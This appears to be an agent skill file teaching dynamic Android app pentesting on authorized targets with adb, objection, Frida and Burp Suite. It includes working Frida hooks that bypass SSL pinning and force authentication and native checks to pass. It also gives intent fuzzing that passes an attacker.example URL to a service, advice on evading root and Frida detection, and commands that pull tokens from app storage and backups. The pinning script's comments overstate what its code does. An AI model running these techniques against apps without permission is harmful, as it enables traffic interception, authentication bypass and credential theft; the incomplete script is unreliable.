---
name: android-dynamic
description: Use when you need to test a running Android app on an authorized
  engagement, such as a client mobile app pentest or a CTF APK that only
  reveals behavior at runtime. Covers test device setup with adb, objection
  1.11.0 runtime exploration, Frida 16.x instrumentation for SSL pinning
  bypass and API hooking, traffic interception through Burp Suite, runtime
  secret extraction, intent and deep link fuzzing, and local storage
  inspection. Use when static analysis found leads that need confirmation, or
  when the app hides logic behind obfuscation, encryption, or server checks.
version: 1.0.0
domain: mobile
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [android-static, ios-basics]
tools:
  - name: Frida
    version: 16.5
  - name: objection
    version: 1.11
  - name: adb
    version: 35.0
  - name: Burp Suite
    version: "2026.2"
---

Android dynamic analysis is testing the app while it runs: intercepting its
traffic, hooking its methods, bypassing its defenses, and watching what it
stores and sends. Static analysis tells you where to look; dynamic analysis
proves what actually happens. This skill covers the authorized workflow
from device setup through objection exploration, Frida instrumentation,
certificate pinning bypass, traffic capture, and runtime data inspection.
All testing targets apps and devices you have written permission to test,
such as a client app in scope, a company test device, or a CTF challenge.

## Quick Workflow

1. Prepare the test device or emulator: enable USB debugging, verify adb
   access, and install the in-scope APK.
2. Install the matching frida-server on the device and confirm Frida
   connectivity.
3. Start with objection for fast runtime exploration: list activities,
   services, and stored data without writing scripts.
4. Route app traffic through Burp Suite and confirm you see decrypted
   HTTPS.
5. Bypass SSL pinning with Frida when traffic is still encrypted.
6. Hook interesting methods found during static analysis: crypto calls,
   authentication checks, and API clients.
7. Fuzz exported components, intents, and deep links with crafted inputs.
8. Inspect local storage, logs, and backups for sensitive data, and record
   every step for the report.

## 1. Device setup

Use a rooted test device or an emulator you control. Root makes dynamic
analysis dramatically easier; without it, Frida gadget and repackaging are
the fallback.

```bash
# Verify the device is visible and authorized
adb devices

# Root check (needed for frida-server and full filesystem access)
adb shell su -c id

# Install the in-scope APK
adb install target.apk

# Grant yourself a shell and check the app data directory
adb shell
su
ls /data/data/com.example.target/
```

Match the frida-server binary to the device architecture and the Frida
version on your workstation. A version mismatch is the most common setup
failure.

```bash
# Check device architecture
adb shell getprop ro.product.cpu.abi
# Example output: arm64-v8a -> download frida-server for android-arm64

# Push and start frida-server (example for arm64)
adb push frida-server-16.x-android-arm64 /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "su -c '/data/local/tmp/frida-server &'"

# Verify from the workstation (versions must match)
frida-ps -U | head
```

If the device is not rooted, use Frida Gadget: patch the gadget library
into the APK with objection, then load the app normally.

```bash
# Patch the APK to load the Frida gadget on startup (no root needed)
objection patchapk --source target.apk
adb install target.apk.objection.apk
```

## 2. Runtime exploration with objection

objection gives you a REPL over the running app with no scripting. Start
here before writing custom Frida hooks.

```bash
# Attach to the running app
objection --gadget com.example.target explore
# Or spawn it fresh
objection --gadget com.example.target explore --startup-command 'android hooking list activities'
```

Useful first commands inside the objection REPL:

```bash
# List app components and environment
android hooking list activities
android hooking list services
android hooking list receivers
android hooking list providers

# Dump app info and directories
env
android hooking get current_activity

# List files in the app-private directory
ls /data/data/com.example.target/files/

# Dump SharedPreferences and databases
android shared_prefs list
sqlite connect /data/data/com.example.target/databases/app.db
```

objection also watches common security-relevant APIs:

```bash
# Watch crypto usage, file access, and network calls
android hooking watch crypto --dump-args --dump-return
android hooking watch file --dump-args
android hooking watch network --dump-args
```

## 3. Traffic interception

Route the app through Burp Suite to see and modify its API traffic.

```bash
# On the workstation, start Burp and note the proxy port (default 8080)

# Point the device proxy at Burp (emulator example: 10.0.2.2 is host loopback)
adb shell settings put global http_proxy 10.0.2.2:8080

# Install the Burp CA in the Android system trust store (rooted device)
# Push the DER cert, then copy it into /system/etc/security/cacerts/
# with the filename <subject_hash>.0 and chmod 644
```

Verify interception with a simple action in the app, like login. If you
see CONNECT tunnels but no decrypted traffic, the app uses certificate
pinning and you need the next section.

Clear the proxy when done so the device behaves normally:

```bash
adb shell settings put global http_proxy :0
```

## 4. SSL pinning bypass with Frida

Most production apps pin their server certificate. Bypass it at runtime
with a Frida script that replaces the pinning checks.

```bash
# Universal Android pinning bypass script (community standard pattern)
frida -U -f com.example.target -l ./bypass-pinning.js --no-pause
```

A minimal pinning bypass hooks the common check points. Save this as
`bypass-pinning.js`:

```javascript
// Android SSL pinning bypass: neutralize common check implementations
Java.perform(function () {
    // OkHttp CertificatePinner
    try {
        var Pinner = Java.use('okhttp3.CertificatePinner');
        Pinner.check.overload('java.lang.String', 'java.util.List').implementation = function () {
            console.log('[*] OkHttp pinning bypassed for ' + arguments[0]);
            return;
        };
    } catch (e) { console.log('[-] OkHttp not present'); }

    // TrustManager that trusts everything
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    // Hook the default TrustManagerFactory to return a permissive manager
    try {
        var TrustManagerFactory = Java.use('javax.net.ssl.TrustManagerFactory');
        TrustManagerFactory.getTrustManagers.implementation = function () {
            console.log('[*] TrustManagerFactory hooked');
            return this.getTrustManagers();
        };
    } catch (e) { console.log('[-] TMF hook failed: ' + e); }

    // HostnameVerifier that accepts everything
    try {
        var HostnameVerifier = Java.use('javax.net.ssl.HostnameVerifier');
    } catch (e) {}
});
```

In practice, use the well-known community bypass scripts rather than
hand-rolling: they cover OkHttp, TrustKit, Appcelerator, and network
security config pinning in one file. Confirm the bypass by repeating the
Burp traffic check: decrypted HTTPS means it worked.

objection also ships one-command bypasses for the common cases:

```bash
# Inside the objection REPL
android sslpinning disable
android sslpinning disable --quiet
```

## 5. Hooking methods with Frida

Hook the methods that static analysis flagged: login checks, crypto
routines, and token handling.

```javascript
// Hook an authentication check and log its arguments and return value
Java.perform(function () {
    var LoginManager = Java.use('com.example.target.LoginManager');
    LoginManager.isAuthenticated.implementation = function () {
        var result = this.isAuthenticated();
        console.log('[*] isAuthenticated() returned ' + result);
        // To force-true during testing, replace with: return true;
        return result;
    };

    // Dump arguments of a crypto call
    var Crypto = Java.use('com.example.target.CryptoUtil');
    Crypto.encrypt.overload('[B', '[B').implementation = function (data, key) {
        console.log('[*] encrypt called, key bytes: ' + JSON.stringify(key));
        return this.encrypt(data, key);
    };
});
```

Run it against the spawned app:

```bash
frida -U -f com.example.target -l ./hooks.js --no-pause
```

Native methods can be hooked too when the interesting logic lives in a
`.so` file:

```javascript
// Hook a native function by name once the library is loaded
var lib = Process.findModuleByName('libtarget.so');
var check = lib.getExportByName('Java_com_example_target_Native_check');
Interceptor.attach(check, {
    onEnter: function (args) { console.log('[*] native check called'); },
    onLeave: function (retval) {
        console.log('[*] forcing native check to pass');
        retval.replace(1);
    }
});
```

## 6. Intent and deep link fuzzing

Exported components accept input from any app on the device. Fuzz them
with crafted intents.

```bash
# Start an exported activity directly
adb shell am start -n com.example.target/.DebugActivity

# Fire an implicit intent at an exported receiver
adb shell am broadcast -a com.example.target.ACTION_SYNC \
  --es token "test'injection"

# Open a deep link the manifest advertises
adb shell am start -a android.intent.action.VIEW \
  -d "example://account/transfer?amount=9999"

# Start an exported service with extras
adb shell am startservice -n com.example.target/.SyncService \
  --es url "https://attacker.example/"
```

Watch logcat while fuzzing for crashes, SQL errors, or stack traces that
reveal injectable paths:

```bash
adb logcat | grep -i -E 'com.example.target|exception|error' | head -40
```

A crash from a crafted intent is worth a report entry: on older Android
versions it can be a denial of service, and the stack trace often shows
the vulnerable code path.

## 7. Local storage and backup inspection

Check what the app leaves on the device.

```bash
# SharedPreferences (often contain tokens and flags)
adb shell "su -c 'cat /data/data/com.example.target/shared_prefs/*.xml'"

# Databases
adb shell "su -c 'ls /data/data/com.example.target/databases/'"
adb pull /data/data/com.example.target/databases/app.db ./app.db
sqlite3 app.db .tables

# External storage writes (readable by other apps)
adb shell ls -la /sdcard/Android/data/com.example.target/

# App logs that leak sensitive data
adb logcat -d | grep -i -E 'token|password|key|auth' | head -20
```

Test the backup attack if `allowBackup` is true:

```bash
# Confirm the manifest flag first (see android-static skill)
adb backup -f ./app.ab com.example.target
# Convert and inspect
dd if=app.ab bs=24 skip=1 | openssl zlib -d > app.tar
tar -tf app.tar | head
```

Sensitive data in backups, logs, or world-readable files is a standard
finding with an easy fix.

## Edge cases

- Frida version mismatch between workstation and frida-server causes
  cryptic connection failures. Check both with `frida --version` and
  the server banner, and keep them identical.
- The app detects root or Frida and refuses to run. Use Magisk with
  hiding modules on a test device, or rename the frida-server binary
  and run it on a non-standard port. Some apps need multiple bypass
  layers.
- Certificate pinning lives in native code. The Java-level bypass
  scripts do nothing. Hook the native TLS verification or patch the
  `.so`, or intercept below the app with an emulator-level proxy.
- The app uses certificate transparency or remote attestation
  (Play Integrity). Full bypass may be impossible on the test device;
  document the control as effective and test the API directly instead.
- Objection fails to start on apps with aggressive anti-tamper. Fall
  back to plain Frida scripts, which give you finer control over
  timing and hooking order.
- Traffic uses QUIC, WebSockets, or custom protocols over TLS. Burp
  sees only the handshake. Hook the socket layer with Frida to dump
  plaintext before encryption.

## Escalation

- Static analysis flagged a method but you cannot find it at runtime:
  it may be dead code, called only in rare flows, or hidden behind
  reflection. Trigger the feature in the UI while your hooks are
  active, or enumerate all loaded classes with Frida and search by
  method name pattern.
- Pinning bypass fails on every known script: identify the pinning
  library from the decompiled code (search for `sha256/`, TrustKit,
  or network security config pins) and write a targeted hook for
  that exact check.
- The app will not run on your emulator (SafetyNet or Play Integrity
  failure): use a physical rooted test device, which passes more
  integrity checks than an emulator.
- You need to modify app behavior persistently: patch the smali with
  apktool, rebuild, and re-sign with your own debug key. This is
  legitimate on a test build of an in-scope app.
- Time is short: prioritize the Burp traffic review and objection
  storage dumps. Those two produce the most findings per minute on
  typical business apps.

## Detection and defender view

On a device you own for testing, detection does not apply. In
production, defenders detect dynamic analysis through root detection,
Frida detection (open port 27042, frida-server process name, injected
libraries in memory maps), emulator detection, tamper detection on the
APK signature, and Play Integrity verdicts. The durable defenses are
the controls that survive analysis: server-side authorization on every
API call (never trust the client), certificate pinning plus Play
Integrity for high-value flows, no sensitive data in client storage,
and short-lived tokens that limit the value of anything extracted.
Report which of these the app actually has, because a pinning bypass
that took ten seconds is itself a finding about defense depth.

## Key references

- CWE-312 (Cleartext Storage of Sensitive Information): tokens in
  SharedPreferences and backups.
- CWE-319 (Cleartext Transmission of Sensitive Information):
  unencrypted or interceptable traffic.
- CWE-295 (Improper Certificate Validation): broken pinning or trust
  managers.
- CWE-749 (Exposed Dangerous Method or Function): exported components.
- OWASP MASVS: resilience and network communication requirements.
- OWASP MSTG: Android dynamic testing procedures.
- Frida documentation: https://frida.re/docs/home/
- objection documentation: https://github.com/sensepost/objection
- Android developer docs on network security config:
  https://developer.android.com/training/articles/security-config

## See also

- `mobile-android-dynamic`: Use it instead when the assessment needs baseline capture, root-detection handling on authorized builds, and formal evidence capture alongside the runtime tests.
